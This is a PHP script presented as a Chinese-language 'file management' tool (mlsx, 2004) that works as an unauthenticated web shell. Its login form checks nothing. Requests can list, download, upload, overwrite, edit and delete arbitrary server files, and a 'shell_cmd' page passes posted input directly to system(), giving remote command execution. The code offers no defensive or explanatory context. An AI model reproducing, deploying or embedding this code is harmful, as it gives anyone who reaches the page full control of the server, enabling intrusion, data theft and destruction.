<?php
//all functions
//get all file from current directory
function get_directory_file($path)
{
  $path_id=opendir($path);
while ($file_name=readdir($path_id))
{
   if ($file_name!="." and $file_name!="..")
   {
      if (is_file($path."/".$file_name))
       {
         $found_file[]=$file_name;
		}
	}
}
closedir($path_id);
if (!isset($found_file))
$found_file=array();
return $found_file;
} //ending get_directory_file

function get_sub_directory($dir) //get the subdirectories of current directory
{
	$path_id=opendir($dir);
	while ($file_name=readdir($path_id))
	{
	   if ($file_name!="." and $file_name!="..")
	   {
		  if (is_dir($dir."/".$file_name))
		  {
			 $found_dir[]=$file_name;
			}
      }
	}
	closedir($path_id);
	if (!isset($found_dir))
	$found_dir=array();
	return $found_dir;
}

?>
	<html>
	<head><title>PHP文件管理</title>
	<meta http-equiv="content-type" content="text/html; charset='utf-8' ">
	<link href="file.css" rel="stylesheet" type="text/css">
	</head>
	<body>
	<table border="1" width="250" cellspacing="1" cellpadding="1">
	  <tr>
		<td class="t11" height="7" colspan="3">文件管理登陆</td>
	  </tr>
	  <tr>
		<form  method="post" action="">
		  <td>username
		  <input type="text" name="name"  />
		  </td>
		  <td class="t12" height="9">密码
			<input type="password" name="password" maxlength="22" size="17">
			 </td>
			 <td><input type="submit" name="pass" value="登陆"></td>
		</form>
	  </tr>
	</table>
	</body>
	</html>
<?php
if ($_REQUEST["download"]!="")
{
		$downfile=$_REQUEST["download"];
		if (!@is_file($downfile))
		echo "你要下的文件不存在";
       		 $filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP4 Generated Data');
		readfile($downfile);
		exit;
}
?>
<html>
<head>
<title>内容管理小程序( mlsx 2004-04)</title>
<link href="t.css" rel="stylesheet" type="text/css">
</head>
<body>
<table>
<tr>
<td colspan="2"><h1>PHP文件管理 V1.2 (mlsx)</h1></td>
</tr>
<tr>
<td>
当前路径:
<?php
if (!isset($dir) || $_REQUEST["dir"]=="")
{
$dir=str_replace('','/',dirname(__FILE__));
}
else
{
$dir=$_REQUEST["dir"];
}
?>
<?php
echo "<a href='?dir=".$dir."' >".$dir."</a>";
?>
</td>
<td align="right"><a href="?tools=shell_cmd" target="_blank">shell命令 </a></td>
</tr>
</table>
</body>
</html>
<?php
//use varity functions according to the passing arguments
//user shell command
if ($_REQUEST["tools"]=="shell_cmd") //if the user use phpshell
{
?>
	<html>
	<head><title>PHP文件管理 V1.2</title>
	<meta http-equiv="content-type" content="text/html; charset=gb2312">
	</head>
	<body>
	<table border="1" class="t1" width="750" cellspacing="1" cellpadding="1">
	<form name="" action="" method="post">
	<tr>
	<td class="t11">命令:
	<input type="text" name="command" size="30">
	<input type="submit" value="运行" name="submit">
	phpshell<a href="javascript:location.reload()">刷新</a>
	</td></tr>
	<tr><td class="t12">
	<textarea cols="93" rows="22" readonly name="textarea">
	<?php
	if (!empty($_POST["command"])) {
	  system($_POST["command"]);
	}
	?>
	</textarea>
	</td></tr></form></table>
<?php
} //ending the  phpshell
?>
<?php
//处理文件上传
if ( isset($_REQUEST["uploadfile"]) and $_REQUEST["uploadfile"]!="" and !isset($_POST["tools"]))
{
$path=$_POST["path"];
$current_dir=str_replace('','/',dirname(__FILE__));
if ($path!="./")
$realdir=$current_dir."/".$path;
else
$realdir=$current_dir;
for ($i=0; $i< 20; $i++)
	{
		$tmp_file=$_FILES["file_name"]["tmp_name"][$i];
		if ($tmp_file=="")
		{
			break;
		}
		$realname=$_FILES["file_name"]["name"][$i];
		if (file_exists($realdir."/".$realname)) //file have exist
		{
			//overwrite
			unlink($realdir."/".$realname);
		}
		if (move_uploaded_file($tmp_file,$realdir."/".$realname))
		{
			;
		}
		else
		{
			echo "upload file error";
		}
	}
	$_POST["uploadfile"]="";
	//echo "<script>location.reload();</script>";
}
?>

<?php
//文件上传
if ($_REQUEST["editfile"]=="" )
{
?>
<form enctype="multipart/form-data" action="" method="POST" name="upload" >
<table border="1">
<tr>
<tr>
<td rowspan="21">文件上传</td>
</tr>
<input type="hidden" name="MAX_FILE_SIZE" value="3000000">
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td><input type="file" name="file_name[]" /></td>
</tr>
<tr>
<td>目前路径 <input type="text" name="path"  value="./" /></td>
</tr>
<tr><td colspan="2"><input type="submit" name="uploadfile" value="上传"  /></td></tr>
</table>
</form>
<?php
}		//文件上传表单结束
?>
<?php
//列出当前目录下的所有文件和文件夹
if ($_REQUEST["dir"]!="" || $_SERVER["QUERY_STRING"]=="")
{
	$dir=stripslashes($_REQUEST["dir"]);
	echo "current dir is ".$dir ."<br/>";
	if ($dir=="")		//原来我居然加了一个分号,难怪一直不能运行
	$dir=str_replace('','/',dirname(__FILE__));
	$found_dir=get_sub_directory($dir);
	$found_file=get_directory_file($dir);
	echo "<table border='1'><tr><td>";
		//list all subdirectories;
		echo "<table>";
		echo "<tr><td>目录名</td><td>属性</td><td>操作</td></tr>";
		echo "<tr><td><a href='?dir=".$dir."/./' >.</a></td><td>0777</td><td></td></tr>";
		echo "<tr><td><a href='?dir=".$dir."/../' >..</a></td><td>0777</td><td></td></tr>";
		foreach($found_dir as $key=> $value)
		{
			$property=substr(base_convert(fileperms($dir."/".$value),10,8),-4);
			echo "<tr><td><a href='?dir=".$dir."/".$value."'>".$value." </a></td><td>$property</td><td>删除</td></tr>";
		}
		echo "</table>";
	echo "</td>";
	echo "<td>";
		//list all file at current directory;
		echo "<table>";
		echo "<tr><td>文件名</td><td>文件属性</td><td colspan='3'>文件操作</td></tr>";
		foreach($found_file as $key=> $value)
		{
			$property=substr(base_convert(fileperms($dir."/".$value),10,8),-4);
			echo "<tr><td>".$value."</td><td>".$property."</td><td>";
			echo "<a href='?download=".$dir."/".$value."' >下载</a></td><td><a href=?delfile=";
			echo $dir."/".$value.">删除</a></td>";
			echo "<td><a href='?edit=1&&editfile=".$dir."/".$value." ' target='_blank'>编辑</a></td></tr>";
		}
		echo "</table>";
	echo "</td>";
	echo "</tr></table>";
} //结束文件列表
?>
<?php
//编辑文件
if ($_REQUEST["edit"]==1 and $_REQUEST["editfile"]!="")
{
	$editfile=$_REQUEST["editfile"];
	$filename=basename($editfile);
	$fp=fopen($editfile,"rb");
	$content=fread($fp,filesize($editfile));
	fclose($fp);
	?>
	<form name="fileedit" action="" method="POST">
	<table>
	<tr>
	<td><input type="hidden" name="editfile" value="<?php echo $editfile; ?>" /></td>
	</tr>
	<tr>
	<td>编辑的文件名称 <input type="text" value="<?php echo $filename ?>"  name="filename" /></td>
	</tr>
	<tr>
	<td >
	<textarea name="file_content" rows="25" cols="80">
	<?php
	echo 	stripcslashes($content);
	?>

	</textarea>
	</td>
	</tr>
	<tr>
	<td><input type="submit" value="提交" name="editover" /></td>
	</tr>
	</table>
	</form>
<?php
if ($_REQUEST["editover"]!="" and $_REQUEST["file_content"]!="")
{
	//开始处理文件编辑的提交
	$editfile=$_REQUEST["editfile"];
	$content=stripcslashes($_REQUEST["file_content"]); //un-single quota symbol
	//$length=strlen($content);
	$fp=fopen($editfile,"w");
	fwrite($fp,$content);
	fclose($fp);
	echo "<script>window.close();</script>";
}
}
?>
<?php
//delete file
if ($_REQUEST["delfile"]!="")
{
	unlink($_REQUEST["delfile"]);
}
?>
